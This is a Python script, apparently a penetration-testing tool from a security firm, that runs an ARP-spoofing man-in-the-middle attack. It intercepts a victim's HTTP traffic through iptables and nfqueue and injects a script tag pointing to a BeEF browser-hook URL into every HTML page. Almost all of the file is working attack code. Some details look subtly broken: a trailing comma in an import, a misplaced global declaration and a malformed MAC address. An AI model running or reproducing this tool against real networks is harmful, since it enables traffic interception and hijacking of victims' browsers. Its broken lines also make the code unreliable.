#--
#
# Description: g0t BeEF?
#
#       Author: Level @ CORE Security Technologies, CORE SDI Inc.
#       Email: level@coresecurity.com
#
#
# Copyright (c) CORE Security, CORE SDI Inc.
# All rights reserved.
#
# This computer software is owned by Core SDI Inc. and is
# protected by U.S. copyright laws and other laws and by international
# treaties.  This computer software is furnished by CORE SDI Inc.
# pursuant to a written license agreement and may be used, copied,
# transmitted, and stored only in accordance with the terms of such
# license and with the inclusion of the above copyright notice.  This
# computer software or any other copies thereof may not be provided or
# otherwise made available to any other person.
#
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED
# WARRANTIES ARE DISCLAIMED. IN NO EVENT SHALL CORE SDI Inc. BE LIABLE
# FOR ANY DIRECT,  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY OR
# CONSEQUENTIAL  DAMAGES RESULTING FROM THE USE OR MISUSE OF
# THIS SOFTWARE
#
#--

#echo 1 > /proc/sys/net/ipv4/ip_forward
#capture requests (dont really need these)
#iptables -t nat -A PREROUTING -p tcp --dport 80 -j QUEUE 
#capture responses
#iptables -A FORWARD -p tcp --sport 80 -j QUEUE
from os import geteuid, system
from sys import argv
from time import sleep
from scapy.all import *
import nfqueue, socket, threading, asyncore,


class Spoof():
	def get_mac(self,ip):
		ans,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),timeout=5)
		for snd,rcv in ans:
			return rcv.sprintf("%Ether.src%")

	def reset(self,spoofed_ip,spoofed_mac,victim_ip,victim_mac):
		send(ARP(psrc=spoofed_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff", hwsrc=spoofed_mac))
		send(ARP(psrc=victim_ip, pdst=spoofed_ip, hwdst="ff:ff:ff:ff:ff", hwsrc=victim_mac))
		return

	def poison(self,spoofed_ip,spoofed_mac,victim_ip,victim_mac):
		send(ARP(psrc=spoofed_ip, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff"))
		send(ARP(psrc=victim_ip, pdst=spoofed_ip, hwdst="ff:ff:ff:ff:ff:ff"))
		return			

class Own():
	def handler(self, i, payload):
		packet = IP(payload.get_data())
		try:
			data = packet['Raw']
		except:
			del(packet.chksum)
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(packet), len(packet))
			return
		if ("<html" in packet['Raw'].load):
			print "[*] caught traffic from %s:%i to %s:%i with HTML content.. injecting!" % (packet.src,packet.sport,packet.dst,packet.dport)
			try:
				packet['Raw'].load = packet['Raw'].load.split("</head>")[0]+'<script src="%s"></script></head>' % (url)
			except:
				packet['Raw'].load =  packet['Raw'].load.split("</body>")[0]+'<script src="%s"></script></body>' % (url)
			del(packet.chksum)
			payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(packet), len(packet))
		return
		
class PcapQueue(asyncore.file_dispatcher):
	def __init__(self):
		print '[*] queue started.. waiting for data'
		self._q = nfqueue.queue()
		self._q.set_callback(Own().handler)
		self._q.fast_open(0, socket.AF_INET)
		self._q.set_queue_maxlen(5000)
		self.fd = self._q.get_fd()
		asyncore.file_dispatcher.__init__(self, self.fd, None)
		self._q.set_mode(nfqueue.NFQNL_COPY_PACKET)
	def handle_read(self):
		self._q.process_pending(10)

		
def main():
	print """----------------------\ng0t BeEF?\nLevel@coresecurity.com\nBeta\n----------------------\n """
	if geteuid() != 0:
		print "[*] use root"
		exit(1)	

	from optparse import OptionParser
	parser = OptionParser()
	parser.add_option("--getmac",dest="ipAddr",help="Get MAC for IP")
	parser.add_option("--spoofip",dest="spoofed_ip",help="IP address to Spoof")
	parser.add_option("--victimip",dest="victim_ip",help="IP address to Attack")
	parser.add_option("--url",dest="url",help="BeEF JS Hook URL")
	(o, a) = parser.parse_args()
	
	if (o.ipAddr != None):
		print "[*] MAC Address: %s" % Spoof().get_mac(o.ipAddr)
		exit(0)
	
	if (o.spoofed_ip != None and o.victim_ip != None and o.url != None):
		url = o.url; global url
		spoofed_mac = Spoof().get_mac(o.spoofed_ip)
		victim_mac = Spoof().get_mac(o.victim_ip)
		print "[*] Spoofed IP %s\n[*] Spoofed MAC %s\n[*] Victim IP %s\n[*] Victim MAC %s\n[*] Spoofing.." % (o.spoofed_ip,spoofed_mac,o.victim_ip,victim_mac)
		PcapQueue()
		threading.Thread(target=asyncore.loop, name="nfqueue-parent").start()
		while True:
			try:
				threading.Thread(target=Spoof().poison, args=(o.spoofed_ip,spoofed_mac,o.victim_ip,victim_mac), name="arp-spoof").start()
				sleep(5)
			except KeyboardInterrupt:
				print "[*] killing threads..."
				for thread in threading.enumerate():
					if thread.isAlive():
						try:
							thread._Thread__stop()
						except:
							print '[*] ' + str(thread.getName()) + ' could not be terminated'

				print "[*] fixing ARP tables.."
				Spoof().reset(o.spoofed_ip,spoofed_mac,o.victim_ip,victim_mac)
				exit(0)

	else:
		exit(1)

if __name__=="__main__":
	main()
